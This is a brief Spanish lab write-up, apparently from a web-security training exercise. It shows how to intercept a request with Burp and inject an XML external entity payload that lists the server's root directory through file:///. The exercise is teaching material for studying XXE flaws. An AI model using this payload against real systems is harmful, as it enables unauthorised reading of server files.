## Lesson 4

### Desarrollo

Debemos inyectar código en el XML para listar el contenido de `root` en el equipo comprometido.

### Solución

Podemos interceptar la solicitud con burp y añadir el siguiente `xml`:

```xml
<?xml version="1.0"?>

<!DOCTYPE text [
  <!ENTITY js SYSTEM "file:///">
]>
<comment>  
    <text>
        &js;
    </text>
</comment>
```